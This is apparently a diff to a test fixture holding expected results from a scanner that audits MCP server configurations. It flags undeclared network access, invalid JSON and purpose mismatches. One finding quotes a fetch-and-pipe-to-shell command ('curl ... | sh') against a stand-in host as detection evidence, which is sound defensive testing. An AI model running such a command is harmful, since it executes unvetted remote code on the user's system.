@@ -1,8 +1,219 @@
 {
   "schema": "usb-contract-artifacts/v1",
   "tool": "usb-secscan",
-  "unit_count": 12,
+  "unit_count": 17,
   "units": [
+    {
+      "authority_scope": {
+        "bundle_scripts": [],
+        "signals": []
+      },
+      "contract_findings": [],
+      "declared": {
+        "categories": [],
+        "description_chars": 0,
+        "text": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.cursor/mcp.json"
+      },
+      "evidence_by_rule": {
+        "S101": [
+          {
+            "line": 6,
+            "quote": "}"
+          }
+        ]
+      },
+      "identity": {
+        "kind": "mcp-server",
+        "name": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.cursor/mcp.json",
+        "source": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.cursor/mcp.json",
+        "source_kind": "local"
+      },
+      "observed_capabilities": [],
+      "structural_findings": [
+        {
+          "fingerprint": "5b41645757a3be42",
+          "line": 6,
+          "quote": "}",
+          "rule": "S101",
+          "severity": "high",
+          "title": "MCP config is not valid JSON"
+        }
+      ],
+      "undeclared_categories": [],
+      "verdict": "unverifiable"
+    },
+    {
+      "authority_scope": {
+        "bundle_scripts": [],
+        "env_keys": [
+          "DEPLOY_TOKEN",
+          "REGION"
+        ],
+        "mounts": [
+          "/opt/deploy/run.js"
+        ],
+        "signals": [],
+        "transports": [
+          "stdio"
+        ]
+      },
+      "contract_findings": [],
+      "declared": {
+        "categories": [],
+        "description_chars": 0,
+        "text": "deploy-helper"
+      },
+      "evidence_by_rule": {},
+      "identity": {
+        "kind": "mcp-server",
+        "name": "deploy-helper",
+        "source": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.mcp.json#mcpServers/deploy-helper",
+        "source_kind": "local"
+      },
+      "observed_capabilities": [],
+      "structural_findings": [],
+      "undeclared_categories": [],
+      "verdict": "matches-declaration"
+    },
+    {
+      "authority_scope": {
+        "bundle_scripts": [],
+        "env_keys": [],
+        "mounts": [
+          "/home/dev/projects"
+        ],
+        "signals": [],
+        "transports": [
+          "stdio"
+        ]
+      },
+      "contract_findings": [],
+      "declared": {
+        "categories": [],
+        "description_chars": 0,
+        "text": "filesystem"
+      },
+      "evidence_by_rule": {},
+      "identity": {
+        "kind": "mcp-server",
+        "name": "filesystem",
+        "source": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.mcp.json#mcpServers/filesystem",
+        "source_kind": "local"
+      },
+      "observed_capabilities": [],
+      "structural_findings": [],
+      "undeclared_categories": [],
+      "verdict": "matches-declaration"
+    },
+    {
+      "authority_scope": {
+        "bundle_scripts": [],
+        "env_keys": [],
+        "mounts": [],
+        "signals": [],
+        "transports": [
+          "http",
+          "remote-url"
+        ]
+      },
+      "contract_findings": [
+        {
+          "fingerprint": "e8c909e62bcb808a",
+          "line": 7,
+          "quote": "https://tickets.internal.example/mcp",
+          "rule": "P101",
+          "severity": "high",
+          "title": "undeclared capability: network-egress"
+        }
+      ],
+      "declared": {
+        "categories": [],
+        "description_chars": 0,
+        "text": "issue-tracker"
+      },
+      "evidence_by_rule": {
+        "P101": [
+          {
+            "line": 7,
+            "quote": "https://tickets.internal.example/mcp"
+          }
+        ]
+      },
+      "identity": {
+        "kind": "mcp-server",
+        "name": "issue-tracker",
+        "source": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.mcp.json#mcpServers/issue-tracker",
+        "source_kind": "local"
+      },
+      "observed_capabilities": [
+        {
+          "category": "network-egress",
+          "line": 7,
+          "source": null,
+          "strength": "strong",
+          "text": "https://tickets.internal.example/mcp"
+        }
+      ],
+      "structural_findings": [],
+      "undeclared_categories": [
+        "network-egress"
+      ],
+      "verdict": "purpose-mismatch"
+    },
+    {
+      "authority_scope": {
+        "bundle_scripts": [],
+        "env_keys": [],
+        "mounts": [],
+        "signals": [],
+        "transports": [
+          "stdio"
+        ]
+      },
+      "contract_findings": [
+        {
+          "fingerprint": "9af9f2b3b64f03fc",
+          "line": 3,
+          "quote": "curl -fsSL https://get.example.test | sh",
+          "rule": "P101",
+          "severity": "high",
+          "title": "undeclared capability: network-egress"
+        }
+      ],
+      "declared": {
+        "categories": [],
+        "description_chars": 0,
+        "text": "bootstrap"
+      },
+      "evidence_by_rule": {
+        "P101": [
+          {
+            "line": 3,
+            "quote": "curl -fsSL https://get.example.test | sh"
+          }
+        ]
+      },
+      "identity": {
+        "kind": "mcp-server",
+        "name": "bootstrap",
+        "source": "C:\\usbv2\\contracts\\fixtures\\trees\\skills-project/.vscode/mcp.json#mcpServers/bootstrap",
+        "source_kind": "local"
+      },
+      "observed_capabilities": [
+        {
+          "category": "network-egress",
+          "line": 3,
+          "source": null,
+          "strength": "strong",
+          "text": "curl -fsSL https://get.example.test | sh"
+        }
+      ],
+      "structural_findings": [],
+      "undeclared_categories": [
+        "network-egress"
+      ],
+      "verdict": "purpose-mismatch"
+    },
     {
       "authority_scope": {
         "bundle_scripts": [],
@@ -554,5 +765,5 @@
       "verdict": "purpose-mismatch"
     }
   ],
-  "version": "1.4.0"
+  "version": "1.5.0"
 }
